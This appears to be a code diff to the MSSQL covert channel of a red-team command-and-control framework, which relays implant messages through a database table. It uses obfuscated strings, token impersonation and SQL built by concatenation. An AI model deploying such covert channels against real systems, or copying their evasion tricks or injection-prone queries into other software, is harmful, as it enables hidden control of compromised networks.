@@ -6,6 +6,10 @@
 #include "Common/FSecure/Crypto/Base64.h"
 
 #define DATA_LEN 1024
+#define ID_COLUMN 1
+#define MSGID_COLUMN 2
+#define MSG_COLUMN 3
+#define MAX_MSG_BYTES 700000000
 
 FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 	: m_inboundDirectionName{ arguments.Read<std::string>() }
@@ -34,13 +38,10 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 
 		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &impersonationToken))
 			throw std::runtime_error("[x] error duplicating token");
-
-		
 	}
 	
 	if (Connect(&hConn, &hEvt) == SQL_ERROR)
 		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));
-
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 
@@ -56,7 +57,7 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 	if (SQLFetch(hStmt) != SQL_SUCCESS)
 	{
 														
-		stmtString = OBF("CREATE TABLE dbo.") + this->tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSG varchar(max));");
+		stmtString = OBF("CREATE TABLE dbo.") + this->tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
 		
 		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
 		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
@@ -85,10 +86,28 @@ size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteVi
 
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
+	
+	int bytesWritten = 0;
+	std::string b64packet = "";
+	std::string strpacket = "";
+	int actualPacketSize = 0;
+	
+	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
+	if (packet.size() > MAX_MSG_BYTES) {
+		
+		actualPacketSize = std::min((size_t)MAX_MSG_BYTES, packet.size());
+		strpacket = packet.SubString(0, actualPacketSize);
 
-	std::string b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
-	std::string stmtString = OBF("INSERT into dbo.") + this->tablename + OBF(" (MSG) VALUES ('") + this->m_outboundDirectionName + b64packet + OBF("');");
+		b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
+		bytesWritten = strpacket.size();
+	}
+	else {
+		b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
+		bytesWritten = packet.size();
+	}
 
+	std::string stmtString = OBF("INSERT into dbo.") + this->tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
+	
 	if (SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS) != SQL_SUCCESS)
 		throw std::exception(OBF("[x] Could not insert data\n"));
 
@@ -97,7 +116,7 @@ size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteVi
 	SQLDisconnect(hConn);
 	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
 	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
-	return packet.size();
+	return bytesWritten;
 }
 
 std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnReceiveFromChannel()
@@ -110,27 +129,31 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 
 	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 
-	std::string stmt = OBF("SELECT TOP 1 * FROM dbo.") + this->tablename + OBF(" WHERE MSG like '") + this->m_inboundDirectionName + OBF("%';");
+	std::string stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
 	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
 
 	std::vector<ByteVector> messages;
 
 	SQLCHAR ret[DATA_LEN];
 	SQLLEN len;
-	std::string output;
+	
 	
 	std::vector<json> data;
-	std::string id;
-
+	
+	
 	while (SQLFetch(hStmt) == SQL_SUCCESS) 
 	{
+		std::string output;
+		std::string id;
+
 		//get the ID
-		SQLGetData(hStmt, 1, SQL_CHAR, ret, DATA_LEN, &len);
+		SQLGetData(hStmt, ID_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
 		id = (char*)ret;
 		json j;
 		j[OBF("id")] = id;
-
-		SQLGetData(hStmt, 2, SQL_CHAR, ret, DATA_LEN, &len);
+	
+		//Get the MSG column
+		SQLGetData(hStmt, MSG_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
 		
 		output += (char*)ret;
 
@@ -139,28 +162,27 @@ std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnRec
 			//loop until there is no data left
 			while (len > DATA_LEN)
 			{
-				SQLGetData(hStmt, 2, SQL_CHAR, ret, DATA_LEN, &len);
+				SQLGetData(hStmt, MSG_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
 				output += (char*)ret;
 			}
 
 		}
-		//this is pretty gross
-		j[OBF("msg")] = output.substr(this->m_inboundDirectionName.size(), output.size());
+		j[OBF("msg")] = output.c_str();
 		data.push_back(j);
 	}
 	
-
-	for (auto& msg : data)
+	for (auto &msg : data)
 	{
 		//delete the row in the DB - must realloc the stmt handle
 		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
 		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 		stmt = OBF("DELETE FROM dbo.") + this->tablename + OBF(" WHERE ID = '") + msg[OBF("id")].get<std::string>() + OBF("';");
 		SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
-		
+
 		//add the message to the messages vector
 		auto m = cppcodec::base64_rfc4648::decode(msg[OBF("msg")].get<std::string>());
-		messages.emplace_back(std::move(m));
+		
+		messages.push_back(std::move(m));
 	}
 
 	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
@@ -183,8 +205,6 @@ SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQ
 	if (SQLAllocHandle(SQL_HANDLE_DBC, lhEvt, &lhConn) != SQL_SUCCESS)
 		throw std::exception(OBF("[x] Error allocating handle"));
 
-	
-
 	if (this->useSSPI)
 	{
 		if (!this->username.empty())
@@ -193,13 +213,15 @@ SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQ
 				throw std::runtime_error("[x] error setting token");
 		}
 			
-		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;Trusted Connection=yes;");
+		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;");
 	}
 	else
 		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";UID=") + this->username + OBF(";PWD=") + this->password;
 
-	SQLRETURN retCode = SQLDriverConnectA(lhConn, NULL, (SQLCHAR*)connString.c_str(), SQL_NTS, ret, DATA_LEN, NULL, SQL_DRIVER_NOPROMPT);
 
+
+	SQLRETURN retCode = SQLDriverConnectA(lhConn, NULL, (SQLCHAR*)connString.c_str(), SQL_NTS, ret, DATA_LEN, NULL, SQL_DRIVER_NOPROMPT);
+	
 	//Pointer dereferencing is done here to make the code easier to read
 	*hConn = lhConn;
 	*hEvt = lhEvt;
